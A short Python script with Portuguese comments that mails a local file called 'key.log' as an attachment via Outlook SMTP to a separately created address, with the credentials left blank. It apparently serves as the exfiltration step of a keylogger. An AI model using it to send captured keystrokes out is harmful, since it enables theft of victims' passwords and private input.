import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

try:
    fromaddr = "" ##e-mail
    toaddr = '' #e-mail criado
    msg = MIMEMultipart()

    msg['From'] = fromaddr 
    msg['To'] = toaddr
    msg['Subject'] = "Teste"

    body = "\nCorpo da mensagem"

    msg.attach(MIMEText(body, 'plain'))

    filename = 'key.log'

    attachment = open('key.log','rb')


    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    attachment.close()

    server = smtplib.SMTP('smtp.outlook.com', 587)
    server.starttls()
    server.login(fromaddr, "") ##senha
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    print('\nEmail enviado com sucesso!')
except:
    print("\nErro ao enviar email")
